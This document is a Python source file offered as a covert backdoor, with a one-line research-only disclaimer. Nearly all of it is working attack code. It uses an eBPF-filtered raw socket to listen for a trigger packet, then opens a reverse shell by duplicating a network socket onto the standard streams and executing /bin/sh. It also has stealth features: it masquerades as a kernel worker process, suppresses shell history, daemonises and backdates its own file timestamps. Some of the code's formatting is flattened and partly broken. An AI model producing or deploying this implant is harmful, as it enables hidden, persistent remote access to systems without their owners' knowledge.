Enhanced Python Covert Backdoor with eBPF, RC4, and Stealth Features

WARNING: For research and educational purposes only

import os import socket import struct import signal import time import ctypes import subprocess from select import select from Crypto.Cipher import ARC4 from bcc import BPF

BUF_SIZE = 32768 RC4_KEY = b"justforfun" TRIGGER_PORT = 53413  # magic trigger port TRIGGER_PASS = b"socket"

Hide process name using prctl (Linux only)

libc = ctypes.CDLL("libc.so.6") PR_SET_NAME = 15 def set_process_name(name): libc.prctl(PR_SET_NAME, ctypes.c_char_p(name.encode()), 0, 0, 0)

RC4 encryption wrapper

class RC4Cipher: def init(self, key): self.cipher = ARC4.new(key)

def encrypt(self, data):
    return self.cipher.encrypt(data)

def decrypt(self, data):
    return self.cipher.decrypt(data)

crypt_ctx = RC4Cipher(RC4_KEY) decrypt_ctx = RC4Cipher(RC4_KEY)

BPF filter to match UDP packets to a specific port (TRIGGER_PORT)

bpf_program = f""" int udp_filter(struct __sk_buff *skb) {{ u8 *cursor = 0; struct ethernet_t {{ u8 dst[6]; u8 src[6]; u16 type; }}; struct ip_t {{ u8 ver_ihl; u8 tos; u16 tlen; u16 identification; u16 flags_fo; u8 ttl; u8 proto; u16 crc; u32 src_ip; u32 dst_ip; }}; struct udp_t {{ u16 sport; u16 dport; u16 len; u16 crc; }};

struct ethernet_t *eth = cursor_advance(cursor, sizeof(*eth));
if (eth->type != 0x0800) return 0;
struct ip_t *ip = cursor_advance(cursor, sizeof(*ip));
if (ip->proto != 17) return 0; // not UDP
struct udp_t *udp = cursor_advance(cursor, sizeof(*udp));
if (udp->dport == {socket.htons(TRIGGER_PORT)}) return -1; // trigger packet
return 0;

}} """

b = BPF(text=bpf_program) fn = b.load_func("udp_filter", BPF.SOCKET_FILTER) sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3)) sock.setsockopt(socket.SOL_SOCKET, socket.SO_ATTACH_BPF, fn.fd)

Launch reverse shell

def remote_shell(host, port): try: s = socket.create_connection((host, port)) set_process_name("[kworker/0:1]")

os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)

    os.environ['HISTFILE'] = '/dev/null'
    os.environ['PS1'] = ''
    os.execve("/bin/sh", ["sh"], os.environ)
except Exception:
    pass

Passive listener (triggered from eBPF filter event manually)

def listen_for_trigger(): while True: pkt = sock.recv(2048) # naive filter simulation (in real case use perf map output) if TRIGGER_PASS in pkt: remote_shell("127.0.0.1", 4444) break

Initialization logic

if name == "main": if os.geteuid() != 0: print("[!] Root required") exit(1)

signal.signal(signal.SIGCHLD, signal.SIG_IGN)
pid = os.fork()
if pid > 0:
    exit(0)

os.setsid()
os.chdir("/")

# Cleanup logs and timestamps (for stealth)
subprocess.call(['touch', '-d', '2009-09-09', __file__])
os.utime(__file__, (1252483200, 1252483200))  # spoof file time

listen_for_trigger()

